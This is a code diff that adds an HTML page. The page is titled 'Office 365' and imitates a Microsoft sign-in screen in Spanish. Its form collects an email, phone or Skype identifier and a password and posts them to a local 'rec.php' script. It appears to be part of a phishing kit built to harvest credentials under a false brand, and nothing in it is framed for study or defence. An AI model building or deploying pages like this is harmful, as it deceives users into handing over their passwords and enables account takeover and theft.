@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Office 365</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="center">
+      <img src="logo.png">
+      <h1>Iniciar Sesión</h1>
+      <form method="POST" action="rec.php">
+        <div class="txt_field">
+          <input type="text" name="correo" required>
+          <span></span>
+          <label>Correo electronico, teléfono o Skype</label>
+        </div>
+        <div class="txt_field">
+          <input type="password" name="contra" required>
+          <span></span>
+          <label>Ingrese sContraseña</label>
+        </div>
+        <div class="pass">¿No puede acceder a su cuenta?</div>
+        <input type="submit" value="Login">
+        <div class="signup_link">
+          ¿No tiene una cuenta? <a href="#">Cree una.</a>
+        </div>
+      </form>
+    </div>
+
+  </body>
+</html>
